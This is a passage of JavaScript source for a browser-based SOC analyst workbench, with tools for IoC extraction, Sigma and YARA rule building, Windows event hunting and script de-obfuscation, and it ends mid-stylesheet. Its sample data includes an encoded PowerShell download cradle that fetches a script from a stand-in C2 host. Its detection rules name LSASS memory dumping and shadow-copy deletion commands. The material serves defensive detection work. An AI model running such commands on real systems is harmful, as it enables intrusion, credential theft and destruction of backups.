/* Privacy Skill Vault — Production SOC Workbench (Capture-Phase Event Engine) */
(function () {
  "use strict";
  if (!/\/tools(?:\/|$)/.test(window.location.pathname)) return;

  const CATEGORIES = [
    { id: "all", label: "All Tools" },
    { id: "soc", label: "SOC & Detection" },
    { id: "ti", label: "Threat Intelligence" },
    { id: "dfir", label: "DFIR & Forensics" },
    { id: "network", label: "Network & Email" },
    { id: "util", label: "Governance & Utilities" }
  ];

  const SIGMA_TEMPLATES = [
    {
      name: "LSASS Memory Dump via Comsvcs.dll",
      yaml: `title: Suspicious LSASS Memory Dump via Comsvcs.dll
id: a1b2c3d4-9912-4e11-8821-ff0011223344
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\rundll32.exe'
    CommandLine|contains|all:
      - 'comsvcs.dll'
      - 'MiniDump'
  filter:
    User|contains: 'AUTHORITY\\SYSTEM'
  condition: selection and not filter
level: critical`
    },
    {
      name: "Kerberoasting RC4 Ticket Request (Event 4769)",
      yaml: `title: Kerberoasting RC4-HMAC Encryption Ticket Request
id: b2c3d4e5-1122-4a33-9944-001122334455
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: '4769'
    TicketEncryptionType: '0x17'
  filter:
    ServiceName|endswith: '$'
  condition: selection and not filter
level: high`
    },
    {
      name: "Volume Shadow Copy Deletion via Vssadmin/WMIC",
      yaml: `title: Shadow Copy Deletion for Ransomware Preparation
id: c3d4e5f6-2233-4b44-8855-112233445566
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'vssadmin delete shadows'
      - 'wmic shadowcopy delete'
      - 'bcdedit /set {default} recoveryenabled no'
  condition: selection
level: critical`
    }
  ];

  const TOOLS = [
    {
      id: "ioc",
      cat: "ti",
      badge: "IOC",
      shortTitle: "Bulk IoC Extractor",
      title: "Bulk IoC Extractor & Defanger",
      desc: "Extract IPv4s, domains, URLs, emails, CVEs, and SHA-256/MD5 hashes from raw logs and defang indicators safely.",
      options: ["Defang Output (hxxps / [.])", "Raw Extracted Values"],
      actionLabel: "Extract Indicators",
      sample: `2026-10-17 10:14:23 WKSTN-FIN-09 src=10.24.18.44 dst=185.220.101.42 url=https://login-gateway.evil-pay-verify.com/stage2/payload.ps1 user=admin
2026-10-17 10:15:07 SRV-DC01 src=10.10.0.5 dst=45.155.205.233 sender=urgent-alert@sec-account-verify.org cve=CVE-2024-21412
2026-10-17 10:16:11 WKSTN-HR-02 sha256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 md5=44d88612fea8a8f36de82e1278abb02f`,
      whatItDoes: "Parses unstructured firewall logs, phishing emails, threat reports, and SIEM exports to extract and deduplicate IPv4 addresses, URLs, domains, email addresses, file hashes (MD5, SHA-1, SHA-256), and CVE identifiers.",
      whyItMatters: "During active incident triage, manually copying indicators from raw logs is slow and error-prone. Accidental clicks on live malicious links inside ticketing systems can expose analyst workstations.",
      howItWorks: "Uses client-side regular expression engines to scan input text in memory, deduplicating matches into categorized lists and converting periods and schemes into inert defanged notation (hxxps://domain[.]com).",
      bestPractices: [
        "Always defang URLs and domains before pasting indicators into Jira, ServiceNow, Slack, or executive email reports.",
        "Filter out internal RFC1918 private IPs (10.x.x.x, 192.168.x.x) before querying external threat intelligence feeds.",
        "Pivot directly from any extracted IP or domain into the Multi-Source Threat Intel Hub."
      ],
      faqs: [
        { q: "Does any pasted log data leave my browser?", a: "No. Extraction and defanging run 100% locally in your browser's JavaScript engine." },
        { q: "Why should I defang indicators?", a: "Defanging prevents email clients and ticketing systems from turning malicious URLs into clickable hyperlinks." }
      ],
      related: ["ti", "headers", "regex", "deobfuscator"]
    },
    {
      id: "ti",
      cat: "ti",
      badge: "INT",
      shortTitle: "Threat Intel Hub",
      title: "Multi-Source Threat Intel Hub",
      desc: "Enrich IPs and domains in real time using keyless Shodan InternetDB, RDAP ownership, Cloudflare DoH DNS, and OSINT pivots.",
      options: ["Sample IP (1.1.1.1)", "Sample IP (8.8.8.8)", "Sample Domain (example.com)"],
      actionLabel: "Enrich Indicator",
      sample: "1.1.1.1",
      whatItDoes: "Consolidates live indicator enrichment into a single view—querying Shodan InternetDB for open ports and CVEs, RDAP for ASN/registrar ownership, and Cloudflare DNS-over-HTTPS for live DNS records, alongside instant deep-links to VirusTotal, AbuseIPDB, and URLScan.",
      whyItMatters: "SOC analysts often waste minutes opening ten separate tabs for every suspicious IP or domain. Aggregating open ports, vulnerabilities, registration data, and DNS resolution accelerates triage.",
      howItWorks: "Executes direct browser HTTPS requests to CORS-enabled public security APIs (internetdb.shodan.io, rdap.org, and cloudflare-dns.com) and formats the JSON responses into a unified report card.",
      bestPractices: [
        "Check open ports and CVEs on external IPs before escalating perimeter scan alerts.",
        "Inspect RDAP registration dates—newly registered domains (< 30 days) are high-confidence phishing indicators.",
        "Use the direct VirusTotal and AbuseIPDB pivot links for historical passive DNS and community abuse reports."
      ],
      faqs: [
        { q: "Do I need an API key for Shodan InternetDB or RDAP?", a: "No. Shodan InternetDB, ICANN RDAP, and Cloudflare DoH are keyless public endpoints that run directly from your browser." }
      ],
      related: ["ioc", "headers", "cvss", "events"]
    },
    {
      id: "headers",
      cat: "network",
      badge: "EML",
      shortTitle: "Email Header Analyzer",
      title: "Email Header Analyzer",
      desc: "Parse raw SMTP email headers to trace hop-by-hop routing delays, originating IPs, and SPF/DKIM/DMARC alignment.",
      options: ["Full Hop & Auth Analysis", "Extract Routing Hops Only"],
      actionLabel: "Analyze Email Headers",
      sample: `Return-Path: <security-notice@paypa1-support-alert.com>
Received: from mail.internal-gateway.local (10.10.2.15) by mx.enterprise.org with ESMTPS id 991A2B; Sat, 17 Oct 2026 14:22:45 +0000
Received: from relay-out.bulletproof-host.net ([185.193.125.44]) by mail.internal-gateway.local with ESMTP; Sat, 17 Oct 2026 14:22:11 +0000
Received: from workstation-win10 ([91.215.85.19]) by relay-out.bulletproof-host.net with SMTP; Sat, 17 Oct 2026 14:15:02 +0000
From: "Corporate Helpdesk" <admin@enterprise.org>
Reply-To: <collect-credentials@paypa1-support-alert.com>
Subject: URGENT: Mandatory MFA Token Re-synchronization Required
X-Originating-IP: [91.215.85.19]
Authentication-Results: mx.enterprise.org; spf=fail smtp.mailfrom=paypa1-support-alert.com; dkim=fail; dmarc=fail action=quarantine`,
      whatItDoes: "Reconstructs the chronological delivery path of an email from bottom-to-top Received headers, extracts sender envelope mismatches, and highlights SPF, DKIM, and DMARC authentication results.",
      whyItMatters: "Display names and From headers are trivially spoofed in phishing attacks. True attribution requires inspecting the bottom-most external Received hop, Return-Path, and Authentication-Results headers.",
      howItWorks: "Parses multiline RFC 5322 header blocks locally, reverses the Received stack into chronological Hop 1 → Final Hop order, calculates inter-hop transit delays, and flags Reply-To/From domain discrepancies.",
      bestPractices: [
        "Always trust the Authentication-Results header stamped by your own receiving mail gateway (top-most hop).",
        "Look for mismatches between the header From domain, the Return-Path (Envelope Sender), and the Reply-To address."
      ],
      faqs: [
        { q: "Why are Received headers read from bottom to top?", a: "Each mail server prepends its Received line to the top of the header block as the message transits, so the bottom-most Received line represents the earliest hop." }
      ],
      related: ["ioc", "ti", "deobfuscator", "report"]
    },
    {
      id: "sigma",
      cat: "soc",
      badge: "SGM",
      shortTitle: "Sigma Rule Translator",
      title: "SIEM Query Builder & Sigma Translator",
      desc: "Validate YAML Sigma detection rules and dynamically translate selection/filter logic into Elastic KQL, Splunk SPL, and Sentinel KQL.",
      options: ["Template: LSASS Dump", "Template: Kerberoasting 4769", "Template: ShadowCopy Delete"],
      actionLabel: "Translate Sigma Rule",
      sample: SIGMA_TEMPLATES[0].yaml,
      whatItDoes: "Parses Sigma YAML detection rules—including field modifiers (|contains, |startswith, |endswith, |all) and filter exclusions—and translates them into ready-to-run queries for Elastic/Kibana, Splunk, and Microsoft Sentinel.",
      whyItMatters: "Detection engineers maintain vendor-agnostic detections in Sigma YAML. Manually rewriting complex boolean conditions for three different SIEM query languages introduces syntax bugs.",
      howItWorks: "Extracts selection and filter key-value blocks from the YAML detection section, maps Windows/Sysmon field names to ECS, CIM, and Sentinel schemas, and compiles boolean queries dynamically.",
      bestPractices: [
        "Test translated queries against 7–30 days of historical telemetry before enabling production alerting.",
        "Add environment-specific service account or path exclusions inside a dedicated filter block."
      ],
      faqs: [
        { q: "Does this translator dynamically parse my custom YAML fields?", a: "Yes. Any field or string list you add under selection: or filter: is dynamically parsed and mapped into Elastic KQL, Splunk SPL, and Sentinel KQL." }
      ],
      related: ["events", "regex", "yara", "json"]
    },
    {
      id: "events",
      cat: "soc",
      badge: "EVT",
      shortTitle: "Event ID Encyclopedia",
      title: "Windows & Sysmon Event Encyclopedia",
      desc: "Search 30+ high-value Windows Security and Sysmon Event IDs with XML field schemas, MITRE ATT&CK mappings, and KQL hunts.",
      options: ["All Event Sources (16)", "Windows Security Only", "Sysmon Only"],
      actionLabel: "Search Event IDs",
      sample: "ALL",
      whatItDoes: "Provides an instant-search reference for critical Windows Security (4624, 4625, 4688, 4697, 4698, 4720, 4769, 1102) and Sysmon (IDs 1–29) events, detailing XML fields, LogonTypes, MITRE ATT&CK techniques, and KQL hunting queries.",
      whyItMatters: "Memorizing Windows event schemas, hexadecimal failure codes (0xC000006A), and Sysmon GrantedAccess masks (0x1010) is difficult during high-pressure investigations.",
      howItWorks: "Filters an embedded forensic dataset by Event ID, keyword (e.g., 'lsass', 'kerberos', 'rdp', 'service'), or MITRE technique ID.",
      bestPractices: [
        "Correlate Event ID 4624 (LogonType 3 or 10) with Event ID 4672 to track privileged lateral movement.",
        "Enable command-line auditing via GPO so Event ID 4688 captures full process arguments."
      ],
      faqs: [
        { q: "How do I browse all events vs searching a specific ID?", a: "Type 'ALL' (or clear the search box) to view the full encyclopedia, or type '4624', '10', 'lsass', or 'kerberos' to filter immediately." }
      ],
      related: ["sigma", "json", "regex", "report"]
    },
    {
      id: "regex",
      cat: "soc",
      badge: "RGX",
      shortTitle: "Log Regex Sandbox",
      title: "Log Analyzer & Regex Sandbox",
      desc: "Test custom regular expressions and named capture groups (?<name>...) against multi-line security logs in real time.",
      options: ["Sample: SSH Auth Logs", "Sample: Palo Alto CEF Firewall"],
      actionLabel: "Run Regex Extraction",
      sample: `PATTERN::(?<time>\\d{4}-\\d{2}-\\d{2}\\s+[\\d:]+)\\s+(?<host>\\S+)\\s+sshd\\[\\d+\\]:\\s+Failed password for (?:invalid user )?(?<user>\\S+) from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+)
LOG::2026-10-16 10:14:23 server01 sshd[2190]: Failed password for invalid user root from 203.0.113.45 port 51234 ssh2
2026-10-16 10:15:07 server01 sshd[2194]: Failed password for admin from 198.51.100.23 port 49112 ssh2
2026-10-16 10:16:11 server02 sshd[8812]: Failed password for invalid user oracle from 192.0.2.10 port 38291 ssh2
2026-10-16 10:18:45 server01 sshd[2209]: Failed password for analyst1 from 203.0.113.77 port 55100 ssh2`,
      whatItDoes: "Compiles your custom JavaScript/PCRE regular expression against raw log lines and dynamically builds a structured table from your named capture groups (?<field>...) or numbered groups.",
      whyItMatters: "Writing custom SIEM parsers, Logstash Grok patterns, or regex field extractors without live capture-group feedback often leads to missed log variants.",
      howItWorks: "Splits the input into PATTERN:: and LOG:: sections, executes RegExp.matchAll() across all lines, and dynamically generates table columns matching whatever named groups you defined.",
      bestPractices: [
        "Use named capture groups like (?<src_ip>...) so extracted fields map cleanly to SIEM column headers.",
        "Avoid greedy .* wildcards when matching delimited logs; use negated character classes like [^|]+ instead."
      ],
      faqs: [
        { q: "How do I test my own regex pattern?", a: "Put your regex after PATTERN:: on the first line, and paste your raw logs after LOG:: on the following lines." }
      ],
      related: ["ioc", "sigma", "json", "events"]
    },
    {
      id: "yara",
      cat: "dfir",
      badge: "YAR",
      shortTitle: "YARA Rule Builder",
      title: "YARA Rule Builder & Syntax Linter",
      desc: "Build complete YARA rules with custom strings, hex wildcards, PE header checks, and live unreferenced-string linting.",
      options: ["Preset: CobaltStrike Loader", "Preset: Ransomware Note & Crypto"],
      actionLabel: "Build & Validate YARA",
      sample: `RULE_NAME::Detect_CobaltStrike_Beacon_Loader
META_AUTHOR::SOC Detection Engineering
META_SEVERITY::Critical
STRINGS::
$s1 = "powershell.exe -nop -w hidden -enc" ascii wide nocase
$s2 = "ReflectiveLoader" ascii fullword
$s3 = "VirtualAllocEx" ascii
$hex1 = { 4D 5A 90 00 03 00 00 00 [4-16] 50 45 00 00 }
CONDITION::uint16(0) == 0x5A4D and filesize < 5MB and ($hex1 or 2 of ($s*))`,
      whatItDoes: "Compiles structured metadata, string definitions, and condition logic into a properly formatted YARA rule while checking for syntax errors, unbalanced quotes/hex braces, and unreferenced string variables.",
      whyItMatters: "Syntax typos or forgetting to reference a defined string in the condition block will cause YARA scanners and EDR hunting jobs to reject the rule.",
      howItWorks: "Parses your custom STRINGS:: and CONDITION:: blocks, validates every $variable against the condition expression, and outputs the complete .yar file.",
      bestPractices: [
        "Filter by uint16(0) == 0x5A4D and filesize < 10MB first in your condition to dramatically speed up scanning.",
        "Combine unique strings with fullword and wide modifiers to catch UTF-16 compiled .NET/Windows binaries."
      ],
      faqs: [
        { q: "Does this linter detect unused string variables?", a: "Yes. If you define $s4 in STRINGS:: but forget to include it in CONDITION::, the linter immediately warns you." }
      ],
      related: ["deobfuscator", "sigma", "ioc", "report"]
    },
    {
      id: "deobfuscator",
      cat: "dfir",
      badge: "DEC",
      shortTitle: "Script De-obfuscator",
      title: "Safe Script & Payload De-obfuscator",
      desc: "Safely decode UTF-16LE PowerShell -EncodedCommand, Base64, Hex, and URL-encoded scripts without executing code.",
      options: ["Sample: PowerShell UTF-16LE", "Sample: Hex & URL Encoded"],
      actionLabel: "De-obfuscate Payload",
      sample: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbAB3AGEAcgBlAC0AYwAyAC4AZQB2AGkAbAAuAG8AcgBnAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA`,
      whatItDoes: "Decodes obfuscated command lines—including Windows PowerShell UTF-16LE Base64 (-enc), standard Base64, hexadecimal byte strings, and URL encoding—while flagging high-risk API calls and extracting hidden URLs.",
      whyItMatters: "Attackers routinely encode PowerShell download cradles and living-off-the-land commands to bypass static signatures and hide C2 domains.",
      howItWorks: "Strips null bytes from UTF-16LE Base64 payloads entirely in memory as inert text strings, never invoking eval() or any shell interpreter.",
      bestPractices: [
        "Never run unknown encoded scripts in a live terminal to see what they do; always decode them as inert text.",
        "Copy any URLs or IPs revealed in the decoded payload directly into the Bulk IoC Extractor to defang them."
      ],
      faqs: [
        { q: "Why does standard Base64 decoding produce null bytes on PowerShell commands?", a: "PowerShell's -EncodedCommand uses UTF-16LE (2 bytes per ASCII character). Our decoder automatically strips interleaved null bytes." }
      ],
      related: ["ioc", "yara", "sigma", "events"]
    },
    {
      id: "json",
      cat: "dfir",
      badge: "JSN",
      shortTitle: "JSON Log Beautifier",
      title: "JSON Log & Alert Beautifier",
      desc: "Validate, pretty-print, and flatten nested Elastic ECS, Sysmon, and AWS CloudTrail JSON logs into readable dot-notation fields.",
      options: ["Flattened Table + Pretty JSON", "Pretty-Printed JSON Only"],
      actionLabel: "Format & Flatten JSON",
      sample: `{"@timestamp":"2026-10-17T15:04:22.419Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"SRV-DC01.corp.local","ip":"10.10.0.5"},"process":{"pid":6412,"executable":"C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe","command_line":"wmic process call create powershell.exe"},"user":{"name":"svc_backup"},"threat":{"tactic":"Execution","technique":"T1047"}}`,
      whatItDoes: "Formats single-line minified JSON logs into indented blocks AND generates a flattened dot-notation key-value table (e.g., process.executable, host.name) for quick SIEM field lookups.",
      whyItMatters: "Raw EDR, CloudTrail, and SIEM webhook alerts arrive as crushed single-line JSON strings that are difficult to read or write KQL field queries against without flattening.",
      howItWorks: "Parses the JSON tree locally in JavaScript, recursively traverses nested objects/arrays to build dot-notation paths, and outputs both the formatted tree and field table.",
      bestPractices: [
        "Use the flattened dot-notation field names directly when building Elastic KQL or Sentinel queries."
      ],
      faqs: [
        { q: "What happens if my JSON log has a syntax error?", a: "The parser highlights the exact reason for the JSON syntax failure so you can fix malformed webhook payloads." }
      ],
      related: ["regex", "sigma", "timestamp", "events"]
    },
    {
      id: "timestamp",
      cat: "util",
      badge: "TIME",
      shortTitle: "Timestamp Converter",
      title: "Multi-Timezone Forensic Timestamp Converter",
      desc: "Convert Unix Epoch (seconds, ms, ns), 18-digit Windows FileTime/LDAP timestamps, and ISO-8601 strings across timezones.",
      options: ["Sample Epoch (Seconds)", "Sample Windows AD FileTime (18-Digit)", "Use Current Live UTC Time"],
      actionLabel: "Convert Timestamp",
      sample: "1760713462",
      whatItDoes: "Converts between Unix Epoch (10-digit seconds, 13-digit milliseconds), 18-digit Windows Active Directory / NTFS FileTime intervals, and ISO-8601 strings, displaying UTC, Local Time, and relative offsets.",
      whyItMatters: "During incident timeline reconstruction, firewall logs may be in UTC Epoch, Active Directory attributes (lastLogonTimestamp) in 18-digit FileTime, and endpoint logs in local time.",
      howItWorks: "Detects timestamp precision automatically by digit length and format, applying BigInt arithmetic for 100-nanosecond Windows FileTime epochs (since January 1, 1601).",
      bestPractices: [
        "Always normalize every timestamp in an incident timeline to UTC before correlating events across hosts."
      ],
      faqs: [
        { q: "How do I convert an 18-digit Windows AD lastLogon value?", a: "Click the 'Sample Windows AD FileTime' pill or paste any 18-digit integer (e.g. 134051966620000000) to convert it instantly." }
      ],
      related: ["json", "report", "events", "headers"]
    },
    {
      id: "severity",
      cat: "util",
      badge: "SEV",
      shortTitle: "Severity Calculator",
      title: "Incident Severity & SLA Calculator",
      desc: "Calculate transparent SOC incident priority (P1–P4), numeric risk scores, SLA response windows, and containment playbooks.",
      options: ["Scenario: P1 Domain Controller Intrusion", "Scenario: P3 Isolated Workstation Alert"],
      actionLabel: "Calculate Incident Severity",
      sample: `ASSET_CRITICALITY::tier1_dc
DATA_SENSITIVITY::regulated_pii
COMPROMISE_SCOPE::multi_host_lateral
THREAT_STATUS::active_c2_exfil
PRIVILEGE_LEVEL::domain_admin`,
      whatItDoes: "Evaluates five core triage factors—Asset Criticality, Data Sensitivity, Compromise Scope, Threat Status, and Privilege Level—to compute a deterministic 0–100 score and P1–P4 Incident Priority.",
      whyItMatters: "Subjective severity ratings lead to alert fatigue on minor events or delayed escalation during critical domain-wide intrusions.",
      howItWorks: "Dynamically weights each parameter in your input block and maps the resulting score to P1 (Critical), P2 (High), P3 (Medium), or P4 (Low) response SLAs.",
      bestPractices: [
        "Any confirmed compromise involving Domain Admin privileges or Tier-1 Domain Controllers should immediately escalate to P1."
      ],
      faqs: [
        { q: "Does changing the values in the input box change the calculated score?", a: "Yes. Click between the P1 and P3 scenario pills or edit the text to watch the score and SLA dynamically recalculate." }
      ],
      related: ["report", "cvss", "ioc", "ti"]
    },
    {
      id: "report",
      cat: "util",
      badge: "RPT",
      shortTitle: "Incident Report Builder",
      title: "Standardized Incident Report Generator",
      desc: "Generate structured executive and technical SOC incident reports in clean Markdown with automatically defanged indicators.",
      options: ["Full Executive + Technical Report", "Defang All Embedded IoCs"],
      actionLabel: "Generate Markdown Report",
      sample: `INCIDENT_ID::INC-2026-10492
TITLE::Unauthorized Credential Dumping & Lateral Movement on SRV-FIN-02
SEVERITY::P1 - Critical
DETECTION_SOURCE::Elastic SIEM / Sysmon Event ID 1 & 10
AFFECTED_ASSETS::SRV-FIN-02 (10.20.4.19), WKSTN-HR-11 (10.20.8.44), Account: corp\\svc_sql
MITRE_TACTICS::TA0006 Credential Access (T1003.001), TA0008 Lateral Movement (T1021.002)
TIMELINE::
2026-10-17 13:10 UTC - Phishing link executed on WKSTN-HR-11 spawning encoded PowerShell.
2026-10-17 13:18 UTC - rundll32.exe comsvcs.dll MiniDump executed against lsass.exe.
2026-10-17 13:31 UTC - SOC isolated both hosts in EDR and rotated svc_sql credentials.
IOCS::185.220.101.42, https://evil-pay-verify.com/stage2.ps1, SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
CONTAINMENT::Isolated both endpoints in EDR; revoked Kerberos TGTs; blocked C2 IP at perimeter firewall.`,
      whatItDoes: "Transforms structured incident notes into a polished, copy-ready Markdown report featuring Executive Summary, Affected Assets, MITRE ATT&CK Mapping, UTC Timeline, Defanged IoCs, and Containment Actions.",
      whyItMatters: "During shift handoffs and executive briefings, inconsistent ticket notes cause critical containment steps or indicators to be overlooked.",
      howItWorks: "Parses section keys locally, automatically defangs all URLs and IPs inside the IOCS block, and formats a clean Markdown document.",
      bestPractices: [
        "Keep all timeline entries strictly in UTC with explicit source hostnames."
      ],
      faqs: [
        { q: "Are indicators in the generated report defanged automatically?", a: "Yes. Any URL or IP address placed in the IOCS:: section is automatically defanged in the final Markdown output." }
      ],
      related: ["severity", "ioc", "timestamp", "headers"]
    },
    {
      id: "cvss",
      cat: "network",
      badge: "CVS",
      shortTitle: "CVSS v3.1 Calculator",
      title: "CVSS v3.1 Base, Temporal & Environmental Calculator",
      desc: "Calculate official FIRST.org CVSS v3.1 Base, Temporal, and Environmental scores dynamically from vector strings or presets.",
      options: ["Critical RCE (10.0)", "High Network PrivEsc (8.8)", "Medium Local Vuln (5.5)"],
      actionLabel: "Calculate CVSS Score",
      sample: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C/CR:H/IR:H/AR:M",
      whatItDoes: "Computes exact FIRST.org CVSS v3.1 Base, Temporal, and Environmental scores (including Impact and Exploitability sub-scores and official RoundUp logic) from any CVSS v3.1 vector string.",
      whyItMatters: "A public CVE Base Score of 9.8 may drop significantly in your environment if the asset is air-gapped or protected by compensating controls—or rise to 10.0 if it sits on a critical internet-facing system.",
      howItWorks: "Parses every metric token (AV, AC, PR, UI, S, C, I, A, E, RL, RC, CR, IR, AR) and applies the official CVSS v3.1 mathematical equations in real time.",
      bestPractices: [
        "Use Temporal metrics (E:U vs E:H) to prioritize vulnerabilities with active public exploit code or CISA KEV listing."
      ],
      faqs: [
        { q: "Does editing the vector string or clicking presets recalculate the score in real time?", a: "Yes. Click any preset pill above or change any metric token in the input box (e.g., AV:N to AV:L) to watch Base, Temporal, and Environmental scores recalculate." }
      ],
      related: ["ti", "severity", "report", "ioc"]
    }
  ];

  const EVENT_DB = [
    { id: "4624", source: "Windows Security", title: "An account was successfully logged on", mitre: "T1078 / T1021", fields: "TargetUserName, IpAddress, LogonType (2=Interactive, 3=Network/SMB, 10=RDP), AuthenticationPackageName", kql: 'event.code: "4624" and winlog.event_data.LogonType: ("3" or "10") and not source.ip: "127.0.0.1"', fp: "Exclude machine accounts ending in $ for routine Type 3 domain controller traffic." },
    { id: "4625", source: "Windows Security", title: "An account failed to log on", mitre: "T1110 (Brute Force)", fields: "TargetUserName, IpAddress, LogonType, SubStatus (0xC000006A=Bad Password, 0xC0000234=Locked)", kql: 'event.code: "4625" and not winlog.event_data.TargetUserName: *$', fp: "Expired service account passwords on scheduled tasks or mapped drives." },
    { id: "4672", source: "Windows Security", title: "Special privileges assigned to new logon", mitre: "T1078.002", fields: "SubjectUserName, PrivilegeList (SeDebugPrivilege, SeBackupPrivilege)", kql: 'event.code: "4672" and winlog.event_data.PrivilegeList: *SeDebugPrivilege*', fp: "Baseline known Domain Admin accounts; alert on standard user accounts." },
    { id: "4688", source: "Windows Security", title: "A new process has been created", mitre: "T1059", fields: "NewProcessName, CommandLine, ParentProcessName, SubjectUserName", kql: 'event.code: "4688" and process.command_line: (*-enc* or *DownloadString* or *comsvcs*)', fp: "Requires 'Include command line in process creation events' GPO." },
    { id: "4697", source: "Windows Security", title: "A service was installed in the system", mitre: "T1543.003", fields: "ServiceName, ServiceFileName, ServiceType, SubjectUserName", kql: 'event.code: "4697" and winlog.event_data.ServiceFileName: (*cmd* or *powershell* or *Temp*)', fp: "Verify against approved software deployment windows." },
    { id: "4698", source: "Windows Security", title: "A scheduled task was created", mitre: "T1053.005", fields: "TaskName, TaskContent (XML Command/Arguments), SubjectUserName", kql: 'event.code: "4698" and winlog.event_data.TaskContent: (*powershell* or *rundll32* or *http*)', fp: "Exclude known enterprise management agents." },
    { id: "4720", source: "Windows Security", title: "A user account was created", mitre: "T1136.001", fields: "TargetUserName, SubjectUserName, SamAccountName", kql: 'event.code: "4720"', fp: "Correlate with IAM provisioning tickets." },
    { id: "4728", source: "Windows Security", title: "A member was added to a privileged global group", mitre: "T1098", fields: "MemberName, TargetUserName (Group Name), SubjectUserName", kql: 'event.code: ("4728" or "4732") and group.name: *Admin*', fp: "Treat unapproved Domain Admin additions as P1 incidents." },
    { id: "4769", source: "Windows Security", title: "A Kerberos service ticket was requested (Kerberoasting)", mitre: "T1558.003", fields: "ServiceName, TicketEncryptionType (0x17=RC4-HMAC), ClientAddress", kql: 'event.code: "4769" and winlog.event_data.TicketEncryptionType: "0x17" and not winlog.event_data.ServiceName: *$', fp: "Legacy service accounts requiring RC4." },
    { id: "1102", source: "Windows Security", title: "The audit log was cleared", mitre: "T1070.001", fields: "SubjectUserName, SubjectDomainName", kql: 'event.code: ("1102" or "104")', fp: "High-confidence defense evasion indicator." },
    { id: "1", source: "Sysmon", title: "Sysmon ID 1 — Process Creation", mitre: "T1059 / T1218", fields: "Image, CommandLine, ParentImage, Hashes (SHA256/IMPHASH), User", kql: 'event.provider: "Microsoft-Windows-Sysmon" and event.code: "1"', fp: "Hunt suspicious parent-child chains (e.g., w3wp.exe or winword.exe spawning cmd/powershell)." },
    { id: "3", source: "Sysmon", title: "Sysmon ID 3 — Network Connection Detected", mitre: "T1071", fields: "Image, SourceIp, DestinationIp, DestinationPort, DestinationHostname", kql: 'event.code: "3" and process.executable: (*rundll32* or *regsvr32* or *certutil* or *mshta*)', fp: "Scope Sysmon config to non-browser binaries." },
    { id: "8", source: "Sysmon", title: "Sysmon ID 8 — CreateRemoteThread Detected", mitre: "T1055 (Process Injection)", fields: "SourceImage, TargetImage, StartAddress", kql: 'event.code: "8" and not process.executable: *MsMpEng.exe', fp: "Exclude signed EDR/AV processes." },
    { id: "10", source: "Sysmon", title: "Sysmon ID 10 — Process Access (LSASS Memory Dump)", mitre: "T1003.001", fields: "SourceImage, TargetImage (lsass.exe), GrantedAccess (0x1010, 0x1410, 0x1F0FFF), CallTrace", kql: 'event.code: "10" and winlog.event_data.TargetImage: *lsass.exe and winlog.event_data.GrantedAccess: ("0x1010" or "0x1410" or "0x1f0fff")', fp: "Alert on dbgcore.dll or comsvcs.dll in CallTrace." },
    { id: "11", source: "Sysmon", title: "Sysmon ID 11 — FileCreate", mitre: "T1105", fields: "Image, TargetFilename, CreationUtcTime", kql: 'event.code: "11" and file.extension: ("ps1" or "exe" or "dll" or "hta")', fp: "Monitor Temp, Downloads, and Startup folders." },
    { id: "22", source: "Sysmon", title: "Sysmon ID 22 — DNS Query Event", mitre: "T1071.004", fields: "Image, QueryName, QueryResults", kql: 'event.code: "22" and not process.executable: (*chrome.exe* or *msedge.exe*)', fp: "Great for catching C2 beacons from PowerShell or rundll32." }
  ];

  let currentView = "catalog";
  let activeCat = "all";
  let searchQuery = "";
  let activeToolId = "ioc";
  let selectedOptionIdx = 0;
  let copyFeedback = false;
  const userInputs = {};

  function esc(str) {
    return String(str || "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function defang(text) {
    return String(text || "").replace(/https?:\/\//gi, m => m.replace(/t/gi, "x")).replace(/\./g, "[.]");
  }

  function getRoot() {
    return document.getElementById("psv-workbench-root") || document.querySelector(".md-content__inner");
  }

  function injectStyles() {
    document.querySelectorAll('link[href*="tools.css"], link[href*="psv-tools.css"], link[href*="soc-workbench.css"]').forEach(el => {
      el.disabled = true;
    });

    if (document.getElementById("psv-hiderox-royal-css")) return;
    const style = document.createElement("style");
    style.id = "psv-hiderox-royal-css";
    style.textContent = `
      .md-grid { max-width: 1380px !important; width: 95% !important; }
      .md-content__inner { margin: 0 !important; padding: 0 !important; max-width: 100% !important; }
      .md-content__inner > h1:first-child { display: none !important; }
      .md-sidebar--primary, .md-sidebar--secondary { display: none !important; }
      body, .md-main { background: #050914 !important; }
      [data-md-color-scheme="default"] body, [data-md-color-scheme="default"] .md-main { background: #f8fafc !important; }

      #psv-app {
        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f1f5f9;
        padding: 1.5rem 0 4rem 0;
      }
      [data-md-color-scheme="default"] #psv-app { color: #0f172a; }
      #psv-app svg { max-width: 22px; max-height: 22px; flex-shrink: 0; }

      .psv-hero-split {
        display: grid;
        grid-template-columns: 1.15fr 0.85fr;
        gap: 2rem;
        align-items: center;
        margin-bottom: 2.25rem;
      }
      @media (max-width: 960px) { .psv-hero-split { grid-template-columns: 1fr; } }

      .psv-eyebrow {
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
        font-family: "JetBrains Mono", monospace;
        font-size: 0.76rem;
        font-weight: 700;
        letter-spacing: 0.14em;
        text-transform: uppercase;
        color: #3b82f6;
        margin-bottom: 0.85rem;
      }
      [data-md-color-scheme="default"] .psv-eyebrow { color: #2563eb; }

      .psv-hero-h1 {
